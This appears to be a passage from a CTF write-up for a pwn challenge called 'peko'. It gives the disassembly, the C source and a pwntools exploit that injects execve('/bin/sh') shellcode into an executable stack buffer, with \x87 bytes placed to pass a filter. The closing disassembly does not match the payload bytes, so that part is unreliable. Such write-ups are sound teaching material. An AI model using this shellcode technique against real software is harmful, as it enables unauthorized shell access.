  4012da:	e8 c1 fd ff ff       	call   4010a0 <puts@plt>
  4012df:	48 8d 3d 1a 18 00 00 	lea    rdi,[rip+0x181a]        # 402b00 <_IO_stdin_used+0xb00>
  4012e6:	e8 b5 fd ff ff       	call   4010a0 <puts@plt>
  4012eb:	48 8d 3d e6 18 00 00 	lea    rdi,[rip+0x18e6]        # 402bd8 <_IO_stdin_used+0xbd8>
  4012f2:	e8 a9 fd ff ff       	call   4010a0 <puts@plt>
  4012f7:	48 8d 3d b2 19 00 00 	lea    rdi,[rip+0x19b2]        # 402cb0 <_IO_stdin_used+0xcb0>
  4012fe:	e8 9d fd ff ff       	call   4010a0 <puts@plt>
  401303:	48 8d 3d 7e 1a 00 00 	lea    rdi,[rip+0x1a7e]        # 402d88 <_IO_stdin_used+0xd88>
  40130a:	e8 91 fd ff ff       	call   4010a0 <puts@plt>
  40130f:	48 8d 3d 4a 1b 00 00 	lea    rdi,[rip+0x1b4a]        # 402e60 <_IO_stdin_used+0xe60>
  401316:	e8 85 fd ff ff       	call   4010a0 <puts@plt>
  40131b:	48 8d 3d 16 1c 00 00 	lea    rdi,[rip+0x1c16]        # 402f38 <_IO_stdin_used+0xf38>
  401322:	e8 79 fd ff ff       	call   4010a0 <puts@plt>
  401327:	48 8d 3d e2 1c 00 00 	lea    rdi,[rip+0x1ce2]        # 403010 <_IO_stdin_used+0x1010>
  40132e:	e8 6d fd ff ff       	call   4010a0 <puts@plt>
  401333:	48 8d 3d ae 1d 00 00 	lea    rdi,[rip+0x1dae]        # 4030e8 <_IO_stdin_used+0x10e8>
  40133a:	e8 61 fd ff ff       	call   4010a0 <puts@plt>
  40133f:	48 8d 3d 7a 1e 00 00 	lea    rdi,[rip+0x1e7a]        # 4031c0 <_IO_stdin_used+0x11c0>
  401346:	e8 55 fd ff ff       	call   4010a0 <puts@plt>
  40134b:	48 8d 3d 46 1f 00 00 	lea    rdi,[rip+0x1f46]        # 403298 <_IO_stdin_used+0x1298>
  401352:	e8 49 fd ff ff       	call   4010a0 <puts@plt>
  401357:	48 8d 3d 12 20 00 00 	lea    rdi,[rip+0x2012]        # 403370 <_IO_stdin_used+0x1370>
  40135e:	e8 3d fd ff ff       	call   4010a0 <puts@plt>
  401363:	48 8d 3d de 20 00 00 	lea    rdi,[rip+0x20de]        # 403448 <_IO_stdin_used+0x1448>
  40136a:	e8 31 fd ff ff       	call   4010a0 <puts@plt>
  40136f:	48 8d 3d aa 21 00 00 	lea    rdi,[rip+0x21aa]        # 403520 <_IO_stdin_used+0x1520>
  401376:	e8 25 fd ff ff       	call   4010a0 <puts@plt>
  40137b:	48 8d 3d 76 22 00 00 	lea    rdi,[rip+0x2276]        # 4035f8 <_IO_stdin_used+0x15f8>
  401382:	e8 19 fd ff ff       	call   4010a0 <puts@plt>
  401387:	48 8d 3d 42 23 00 00 	lea    rdi,[rip+0x2342]        # 4036d0 <_IO_stdin_used+0x16d0>
  40138e:	e8 0d fd ff ff       	call   4010a0 <puts@plt>
  401393:	48 8d 3d 0e 24 00 00 	lea    rdi,[rip+0x240e]        # 4037a8 <_IO_stdin_used+0x17a8>
  40139a:	e8 01 fd ff ff       	call   4010a0 <puts@plt>
  40139f:	48 8d 3d da 24 00 00 	lea    rdi,[rip+0x24da]        # 403880 <_IO_stdin_used+0x1880>
  4013a6:	e8 f5 fc ff ff       	call   4010a0 <puts@plt>
  4013ab:	48 8d 3d a6 25 00 00 	lea    rdi,[rip+0x25a6]        # 403958 <_IO_stdin_used+0x1958>
  4013b2:	e8 e9 fc ff ff       	call   4010a0 <puts@plt>
  4013b7:	48 8d 3d 72 26 00 00 	lea    rdi,[rip+0x2672]        # 403a30 <_IO_stdin_used+0x1a30>
  4013be:	e8 dd fc ff ff       	call   4010a0 <puts@plt>
  4013c3:	48 8d 3d 3e 27 00 00 	lea    rdi,[rip+0x273e]        # 403b08 <_IO_stdin_used+0x1b08>
  4013ca:	e8 d1 fc ff ff       	call   4010a0 <puts@plt>
  4013cf:	48 8d 3d 0a 28 00 00 	lea    rdi,[rip+0x280a]        # 403be0 <_IO_stdin_used+0x1be0>
  4013d6:	e8 c5 fc ff ff       	call   4010a0 <puts@plt>
  4013db:	48 8d 3d d6 28 00 00 	lea    rdi,[rip+0x28d6]        # 403cb8 <_IO_stdin_used+0x1cb8>
  4013e2:	e8 b9 fc ff ff       	call   4010a0 <puts@plt>
  4013e7:	90                   	nop
  4013e8:	5d                   	pop    rbp
  4013e9:	c3                   	ret    

00000000004013ea <main>:
  4013ea:	f3 0f 1e fa          	endbr64 
  4013ee:	55                   	push   rbp
  4013ef:	48 89 e5             	mov    rbp,rsp
  4013f2:	48 83 ec 60          	sub    rsp,0x60
  4013f6:	b8 00 00 00 00       	mov    eax,0x0
  4013fb:	e8 d6 fd ff ff       	call   4011d6 <init>
  401400:	b8 00 00 00 00       	mov    eax,0x0
  401405:	e8 31 fe ff ff       	call   40123b <banner>
  40140a:	48 b8 70 65 6b 6f 70 	movabs rax,0x6f6b65706f6b6570
  401411:	65 6b 6f 
  401414:	48 ba 70 65 6b 6f 70 	movabs rdx,0x6f6b65706f6b6570
  40141b:	65 6b 6f 
  40141e:	48 89 45 a0          	mov    QWORD PTR [rbp-0x60],rax
  401422:	48 89 55 a8          	mov    QWORD PTR [rbp-0x58],rdx
  401426:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40142a:	48 89 55 b8          	mov    QWORD PTR [rbp-0x48],rdx
  40142e:	48 89 45 c0          	mov    QWORD PTR [rbp-0x40],rax
  401432:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  401436:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  40143a:	48 89 55 d8          	mov    QWORD PTR [rbp-0x28],rdx
  40143e:	c6 45 e0 00          	mov    BYTE PTR [rbp-0x20],0x0
  401442:	48 8d 3d 47 29 00 00 	lea    rdi,[rip+0x2947]        # 403d90 <_IO_stdin_used+0x1d90>
  401449:	e8 52 fc ff ff       	call   4010a0 <puts@plt>
  40144e:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  401452:	48 89 c6             	mov    rsi,rax
  401455:	48 8d 3d 61 29 00 00 	lea    rdi,[rip+0x2961]        # 403dbd <_IO_stdin_used+0x1dbd>
  40145c:	b8 00 00 00 00       	mov    eax,0x0
  401461:	e8 6a fc ff ff       	call   4010d0 <__isoc99_scanf@plt>
  401466:	48 8d 45 ec          	lea    rax,[rbp-0x14]
  40146a:	ba 03 00 00 00       	mov    edx,0x3
  40146f:	48 8d 35 4b 29 00 00 	lea    rsi,[rip+0x294b]        # 403dc1 <_IO_stdin_used+0x1dc1>
  401476:	48 89 c7             	mov    rdi,rax
  401479:	e8 12 fc ff ff       	call   401090 <strncmp@plt>
  40147e:	85 c0                	test   eax,eax
  401480:	74 16                	je     401498 <main+0xae>
  401482:	48 8d 3d 3c 29 00 00 	lea    rdi,[rip+0x293c]        # 403dc5 <_IO_stdin_used+0x1dc5>
  401489:	e8 12 fc ff ff       	call   4010a0 <puts@plt>
  40148e:	bf 00 00 00 00       	mov    edi,0x0
  401493:	e8 48 fc ff ff       	call   4010e0 <exit@plt>
  401498:	48 8d 3d 33 29 00 00 	lea    rdi,[rip+0x2933]        # 403dd2 <_IO_stdin_used+0x1dd2>
  40149f:	e8 fc fb ff ff       	call   4010a0 <puts@plt>
  4014a4:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  4014a8:	ba 40 00 00 00       	mov    edx,0x40
  4014ad:	48 89 c6             	mov    rsi,rax
  4014b0:	bf 00 00 00 00       	mov    edi,0x0
  4014b5:	b8 00 00 00 00       	mov    eax,0x0
  4014ba:	e8 f1 fb ff ff       	call   4010b0 <read@plt>
  4014bf:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4014c6:	eb 58                	jmp    401520 <main+0x136>
  4014c8:	8b 4d fc             	mov    ecx,DWORD PTR [rbp-0x4]
  4014cb:	48 63 c1             	movsxd rax,ecx
  4014ce:	48 69 c0 e9 a2 8b 2e 	imul   rax,rax,0x2e8ba2e9
  4014d5:	48 c1 e8 20          	shr    rax,0x20
  4014d9:	89 c2                	mov    edx,eax
  4014db:	d1 fa                	sar    edx,1
  4014dd:	89 c8                	mov    eax,ecx
  4014df:	c1 f8 1f             	sar    eax,0x1f
  4014e2:	29 c2                	sub    edx,eax
  4014e4:	89 d0                	mov    eax,edx
  4014e6:	c1 e0 02             	shl    eax,0x2
  4014e9:	01 d0                	add    eax,edx
  4014eb:	01 c0                	add    eax,eax
  4014ed:	01 d0                	add    eax,edx
  4014ef:	29 c1                	sub    ecx,eax
  4014f1:	89 ca                	mov    edx,ecx
  4014f3:	83 fa 05             	cmp    edx,0x5
  4014f6:	75 24                	jne    40151c <main+0x132>
  4014f8:	8b 45 fc             	mov    eax,DWORD PTR [rbp-0x4]
  4014fb:	48 98                	cdqe   
  4014fd:	0f b6 44 05 a0       	movzx  eax,BYTE PTR [rbp+rax*1-0x60]
  401502:	3c 87                	cmp    al,0x87
  401504:	74 16                	je     40151c <main+0x132>
  401506:	48 8d 3d df 28 00 00 	lea    rdi,[rip+0x28df]        # 403dec <_IO_stdin_used+0x1dec>
  40150d:	e8 8e fb ff ff       	call   4010a0 <puts@plt>
  401512:	bf 00 00 00 00       	mov    edi,0x0
  401517:	e8 c4 fb ff ff       	call   4010e0 <exit@plt>
  40151c:	83 45 fc 01          	add    DWORD PTR [rbp-0x4],0x1
  401520:	83 7d fc 3f          	cmp    DWORD PTR [rbp-0x4],0x3f
  401524:	7e a2                	jle    4014c8 <main+0xde>
  401526:	48 8d 45 a0          	lea    rax,[rbp-0x60]
  40152a:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40152e:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  401532:	b8 00 00 00 00       	mov    eax,0x0
  401537:	ff d2                	call   rdx
  401539:	b8 00 00 00 00       	mov    eax,0x0
  40153e:	c9                   	leave  
  40153f:	c3                   	ret    

0000000000401540 <__libc_csu_init>:
  401540:	f3 0f 1e fa          	endbr64 
  401544:	41 57                	push   r15
  401546:	4c 8d 3d c3 48 00 00 	lea    r15,[rip+0x48c3]        # 405e10 <__frame_dummy_init_array_entry>
  40154d:	41 56                	push   r14
  40154f:	49 89 d6             	mov    r14,rdx
  401552:	41 55                	push   r13
  401554:	49 89 f5             	mov    r13,rsi
  401557:	41 54                	push   r12
  401559:	41 89 fc             	mov    r12d,edi
  40155c:	55                   	push   rbp
  40155d:	48 8d 2d b4 48 00 00 	lea    rbp,[rip+0x48b4]        # 405e18 <__do_global_dtors_aux_fini_array_entry>
  401564:	53                   	push   rbx
  401565:	4c 29 fd             	sub    rbp,r15
  401568:	48 83 ec 08          	sub    rsp,0x8
  40156c:	e8 8f fa ff ff       	call   401000 <_init>
  401571:	48 c1 fd 03          	sar    rbp,0x3
  401575:	74 1f                	je     401596 <__libc_csu_init+0x56>
  401577:	31 db                	xor    ebx,ebx
  401579:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]
  401580:	4c 89 f2             	mov    rdx,r14
  401583:	4c 89 ee             	mov    rsi,r13
  401586:	44 89 e7             	mov    edi,r12d
  401589:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]
  40158d:	48 83 c3 01          	add    rbx,0x1
  401591:	48 39 dd             	cmp    rbp,rbx
  401594:	75 ea                	jne    401580 <__libc_csu_init+0x40>
  401596:	48 83 c4 08          	add    rsp,0x8
  40159a:	5b                   	pop    rbx
  40159b:	5d                   	pop    rbp
  40159c:	41 5c                	pop    r12
  40159e:	41 5d                	pop    r13
  4015a0:	41 5e                	pop    r14
  4015a2:	41 5f                	pop    r15
  4015a4:	c3                   	ret    
  4015a5:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]
  4015ac:	00 00 00 00 

00000000004015b0 <__libc_csu_fini>:
  4015b0:	f3 0f 1e fa          	endbr64 
  4015b4:	c3                   	ret    

Disassembly of section .fini:

00000000004015b8 <_fini>:
  4015b8:	f3 0f 1e fa          	endbr64 
  4015bc:	48 83 ec 08          	sub    rsp,0x8
  4015c0:	48 83 c4 08          	add    rsp,0x8
  4015c4:	c3                   	ret    
```
</details>
<details>
<summary>hint code</summary>

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

void init()
{
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	return;
}

void banner()
{
	puts("⡟⢹⣿⡿⠋⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠙⣿⣿⠉⠛⣿⣿⣿⣿⠋⠉⠉⡟⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⡟⠉⠉⣻⣿⣿⣿⣿⠛⡛⠉⠉⣿⣿⠋⠉⠉⠉⠉⠉⠉⠉⠉⢻");
	puts("⣷⣾⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣀⠛⠁⠀⢹⠀⠀⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠀⠀⢠⣿⣿⣿⠟⢁⣼⣤⣤⣼⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⣗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠛⠉⢩⡀⡠⠀⣼⠇⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⡀⢀⠇⠀⢀⣾⣿⡿⠁⣠⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠤⠚⠉⠀⠀⠀⠀⢹⡿⠖⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠀⢀⠌⠛⢫⡤⠞⢿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡟⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠊⠁⠀⠀⠀⠀⠀⢀⡴⠊⠀⠀⡠⠊⠀⠀⢀⠔⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠈⠀⢀⠀⠃⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀⠀⠀⠀⠀⢀⡾⠋⠀⠀⢀⡾⠀⠀⠀⠀⠁⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢢⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⡄⢀⣴⠋⠀⠀⠀⠀⠀⠀⢀⣴⡿⠄⠀⢀⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣄⠀⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣥⠖⠀⠀⠀⣀⣀⣤⣿⣿⣱⠁⢀⣾⣟⣠⣄⣞⡄⠀⠀⠀⠀⠀⢠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠀⠀⠐⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡄⢸");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣷⣶⣿⠿⢿⣿⣿⣿⣿⣿⡀⣼⣿⣿⣿⣿⡟⠀⠀⠀⢠⡦⠀⣼⣇⠀⠘⣆⠀⠀⠀⠀⠀⠀⠈⣧⠀⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣾");
	puts("⡇⠀⠀⣠⣴⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⣸⠃⢀⣿⣿⡇⠀⣿⡀⠀⠀⠀⡀⠀⣆⠸⡆⠀⣸⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿");
	puts("⡇⢀⣜⣵⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠳⠀⠙⢸⡏⠐⣾⡏⣿⣧⠀⢸⣇⣄⠀⠀⢳⠀⢻⠠⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿");
	puts("⣧⡜⣴⠏⠀⢸⣿⣿⠿⠛⠛⠉⠉⠁⠀⠀⢰⣿⣿⣿⢻⣿⣿⣿⣿⠟⠛⢡⡿⠁⢠⠂⢲⡟⠒⣤⠏⠀⣿⣿⠀⠈⣿⠹⣧⠀⢸⣆⣸⣾⣿⣿⠟⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻");
	puts("⣿⣿⠃⠀⠀⣿⣿⣿⣿⣶⣦⣴⣴⣶⣤⣶⣾⠃⢸⣿⠈⣿⢹⡟⡟⠀⠀⣸⢃⡠⠁⢠⡟⢀⣰⣿⡇⠀⢿⢻⠀⠀⢸⡄⣷⠀⠐⣿⢿⣿⣿⣿⠀⢘⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⠃⠀⠀⢠⣿⣿⣿⣿⣿⣿⡿⠿⠿⠟⠻⣿⠀⣿⡇⢠⡏⢸⣇⡇⠀⠀⣿⣿⠃⣠⠟⢠⣾⠟⠉⠀⠀⢸⣼⡇⠀⠸⣇⢸⠀⠀⣸⠈⣿⣿⣿⣴⣿⣿⠀⠀⠀⢠⣴⡀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣤⣠⢀⡾⠁⠹⣿⣿⣿⣿⣿⣿⣷⣶⣼⡇⢸⣿⡅⢸⠃⢸⣿⠇⠀⠀⣿⣥⣾⣯⡼⠋⠁⠀⠀⠀⠀⠸⡟⢷⠀⠀⢻⡮⠄⠀⣹⠀⡟⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⡿⣣⡾⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⡇⣾⣿⡇⣾⠀⠈⣿⡇⠀⠠⡟⠋⠉⠋⠒⠢⢤⡀⠀⠀⠀⠀⣷⠸⡇⠀⠈⣇⡇⠀⢸⠀⣇⡏⣿⣿⣿⢿⠷⡦⣼⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣾⣿⠷⣶⣶⠦⠬⢿⣿⣿⣿⣿⣮⡛⢿⡇⣛⣙⣃⡿⠀⠀⢿⣿⣆⠀⣷⣶⠾⠿⢿⣶⣦⡁⠀⠀⠀⠀⠘⠀⢿⠀⠀⢹⣷⠀⢻⢸⣿⡇⣿⠈⠉⢸⡄⠀⠀⠹⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣉⣤⣶⡿⡟⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⡇⠀⢀⣬⣿⠻⣆⠘⢂⠀⠀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠀⠘⠃⠶⠦⢽⠄⡌⢸⡿⢠⡏⠀⠀⣸⠀⠀⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⡿⠛⠉⣰⠁⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢸⢸⣽⠀⣹⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠾⢷⣦⣄⠀⠃⣸⠇⣼⠇⠀⠀⣿⠀⠀⠀⠀⢸⣄⠀⠀⠀⠀⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠸⡏⠀⠻⢿⡿⠗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⢻⣦⢠⡟⢠⡟⠀⠀⠀⣿⠀⠀⠀⠀⢸⡏⠛⠳⢤⡀⠀⠀⠀⠀⢸");
	puts("⡿⠛⠉⠀⠀⠀⠀⠀⠀⢠⣶⡄⠈⢿⣿⣿⣿⣿⣿⣿⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡄⠀⢙⡿⣠⣿⡇⠀⠀⣰⣿⠀⠀⠀⠀⢸⣿⠀⠀⠀⠉⠲⣶⣶⣤⣼");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⠀⠀⠻⣿⣿⣿⣿⣿⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣦⣂⠀⠀⠀⠀⠀⠀⣿⡷⢀⣾⣿⡿⣳⠀⠀⡇⣿⣿⡄⠀⠀⠀⣿⣿⡀⠀⠀⠀⠀⠘⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣧⣤⣤⣿⣿⣿⣿⣿⢠⠠⢴⢺⣆⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣷⣿⠆⠀⠀⠈⠀⣸⣿⠟⡇⠋⠀⢸⢱⠙⠻⢷⣄⣠⣾⣿⣿⡇⢰⡀⠀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣾⣿⣷⣄⠀⠀⠀⠀⠀⠀⠈⠛⠿⢿⡿⠿⠋⠀⠀⠀⠀⢰⣿⡄⢠⠀⠀⠀⣿⡎⠀⢀⣴⣿⣿⣿⣿⣿⡇⢸⣇⠀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⠁⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣿⣿⠇⣜⡄⠀⢀⣿⣇⣴⣿⣿⣿⣿⣿⣿⣿⠇⢸⣿⡀⠀⠀⣿⣿⣿");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⢉⡿⠟⠉⠉⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⢀⣀⣤⣴⠚⠛⠋⠉⠀⠀⣿⣷⣴⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢰⣼⣿⣷⣾⣿⡿⠟⢻");
	puts("⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡖⠉⠀⠀⠀⠀⠀⠀⢻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣷⠶⠞⠋⠉⠀⠀⠀⠓⢤⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⢸");
	puts("⡇⠀⣠⣦⠀⠀⠀⠀⠀⢠⡎⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠈⣿⡏⢉⠽⠟⠛⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⢸⣿⣿⣿⣿⢿⣿⣿⣿⠿⢿⣿⣿⡿⢿⣿⣿⣿⣿⡿⠁⠙⢄⢸");
	puts("⡇⢰⣿⣿⠀⠀⠀⠀⢰⡯⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⣾⣿⣿⣿⡇⠸⢿⣿⡄⠀⣼⣿⣻⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⢿");
	puts("⣷⣾⣿⠏⠀⠀⠀⠀⡼⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⣿⣿⣿⣿⠀⠁⠘⣿⣧⣴⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⢸");
	puts("⣿⣿⣿⣷⡀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⣠⡶⠋⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⡘⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⣸");
	puts("⣿⣿⣿⡿⠃⠀⣠⠔⠻⣷⣄⡀⠀⠀⠀⠀⢰⡿⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠻⣼⠱⠁⠘⠿⣿⣿⣿⡟⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⣿");
	puts("⡿⠋⠉⠀⢀⡞⠁⠀⠀⠈⠉⠙⠲⠶⣄⣀⣿⡇⠀⠀⠀⠀⢃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⠀⠀⡿⠁⠀⠀⠀⠀⠉⠹⡇⠉⠻⣿⣿⣿⠃⠀⠀⠀⠀⡀⠀⢸");
	puts("⡇⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⡏⠀⠀⠀⠀⠀⠀⠀⠤⣀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⣀⣠⣤⠖⠋⢸⣿⠀⠸⣇⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠸⢿⣿⡆⠀⠀⠀⣴⣿⣄⣸");
	puts("⣧⣀⣀⣼⣄⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣸⣤⣤⣀⣀⣀⣼⣀⣀⣁⣀⣀⣀⣠⣤⣤⣶⣶⣶⣿⣟⣉⣉⣁⣀⣀⣀⣼⣿⣤⣦⣼⣦⣀⣀⣀⣀⣀⣀⣀⣀⣴⣥⣤⣭⣷⣤⣤⣾⣿⣿⣿⣿");
}

int main()
{
	init();
	banner();
	char ans[4], squeak[] = "pekopekopekopekopekopekopekopekopekopekopekopekopekopekopekopeko";

	puts("I think pekora is the best VTuber. Isn't it?");
	scanf("%3s", ans);

	if (strncmp(ans, "yes", 3))
	{
		puts("poor guy....");
		exit(0);
	}
	else
		puts("You will pass the course.");

	read(0, squeak, 64);

	int i;

	for (i = 0; i < 64; i++)
	{
		if (i % 11 == 5 && squeak[i] != '\x87')
		{
			// printf("i = %d\n", i);
			puts("wwwwwww");
			exit(0);
		}
	}

	void (*func)() = (void (*)())squeak;
	(*func)();

	return 0;
}
```
</details>

**key concept :** <font color = #FF0080 > shellcode </font>

**突破點:** 

1. 要先輸入「yes」才可以過第一關
2. 接著要在輸入字串時，確保在遇到「第6個輸入」和從「第6開始每隔11的char」要是’\x87’才可以通過第二關。

3. 接下來因為這題的保護機制都沒開，而且在最後面有呼叫stack內shellcode的程式碼，所以只要將stack中塞入shellcode就能執行了。依照上述的規則，將設定rax,rdi,rdx,rsi等暫存器和呼叫 stscalls的shellcode輸入進去。
	
4. payload
```python 
from pwn import *
import struct
context.arch = "amd64"
p = process('peko_distribute/share/peko')

pause()
payload = flat(		#end yes to pass first exit(0)
    b"yes",
)
p.send(payload)
payload2 = flat(		#insert the shellcode into the stack
     b"\x50\x48\x31\xd2\xB1\x87\x48\x31\xf6\x80\xE9\x87\x80\xC1\x87\xB1\x87\x48\xC7\xC3\x2F\x2F\x73\x68\xB1\x87\xB1\x87\x48\xC1\xE3\x20\x80\xC1\x87\xB1\x87\xB1\x87\x48\x81\xC3\x2F\x62\x69\x6E\xB1\x87\xB1\x87\x53\x54\x5f\xb0\x3b\x0f\x05\xB1\x87\xB1\x87\x80\xC1\x87")
p.send(payload2)
pause()
p.interactive()

#the shellcode insert into stack turn into assembly code
0:  48 8d 35 13 00 00 00    lea    rsi,[rip+0x13]        # 0x1a
7:  48 83 c4 28             add    rsp,0x28
b:  48 8d 9d 46 ff ff ff    lea    rbx,[rbp-0xba]
12: 38 c2                   cmp    dl,al
14: 48 0f 44 de             cmove  rbx,rsi
18: 53                      push   rbx
19: c3                      ret
